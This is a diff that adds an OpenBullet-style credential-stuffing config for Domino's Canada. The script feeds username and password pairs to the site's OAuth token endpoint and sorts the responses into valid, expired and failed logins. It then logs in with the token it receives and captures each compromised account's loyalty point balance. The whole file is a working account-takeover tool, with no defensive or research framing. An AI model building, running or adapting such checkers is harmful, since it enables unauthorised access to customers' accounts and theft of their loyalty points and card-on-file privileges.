@@ -1,0 +1,114 @@
+[SETTINGS]
+{
+  "Name": "Dominos Ca",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-10T21:35:48.3484604-05:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "FFaez1267",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<PASS>" Contains "%" 
+
+FUNCTION RandomString "?h?h?h?h?h?h?h?h-?h?h?h?h-4?h?h?h-8?h?h?h-?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "guid" 
+
+REQUEST POST "https://api.dominos.ca/as/token.oauth2" 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer:card:read+customer:profile:read:extended+customer:orderHistory:read+customer:card:update+customer:profile:read:basic+customer:loyalty:read+customer:orderHistory:update+customer:card:create+customer:loyaltyHistory:read+order:place:cardOnFile+customer:card:delete+customer:orderHistory:create+customer:profile:update+easyOrder:optInOut+easyOrder:read&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: api.dominos.ca" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 563" 
+  HEADER "DPZ-Market: CANADA" 
+  HEADER "Origin: https://api.dominos.ca" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: bm9sby1ybTo=" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-DPZ-D: <guid>" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Market: CANADA" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "parameter is required for grant_type=password" 
+    KEY "\":\"Invalid username & password combination" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "authn.srvr.code.reset.password" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+REQUEST POST "https://order.dominos.ca/power/login" 
+  CONTENT "loyaltyIsActive=true&rememberMe=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: order.dominos.ca" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 36" 
+  HEADER "DPZ-Market: CANADA" 
+  HEADER "Origin: https://order.dominos.ca" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-DPZ-D: <guid>" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Market: CANADA" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+FUNCTION CurrentUnixTime -> VAR "TS" 
+
+PARSE "<SOURCE>" JSON "CustomerID" -> VAR "UUID" 
+
+REQUEST GET "https://order.dominos.ca/power/customer/<UUID>/loyalty?_=<TS>" 
+  
+  HEADER "Host: order.dominos.ca" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 36" 
+  HEADER "DPZ-Market: CANADA" 
+  HEADER "Origin: https://order.dominos.ca" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-DPZ-D: <guid>" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; LGM-V300K Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36" 
+  HEADER "Market: CANADA" 
+  HEADER "X-Requested-With: com.android.browser" 
+
+PARSE "<SOURCE>" JSON "VestedPointBalance" CreateEmpty=FALSE -> CAP "Points" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Points>" LessThan "60" 
+    KEY "<RESPONSECODE>" Contains "404" 
+
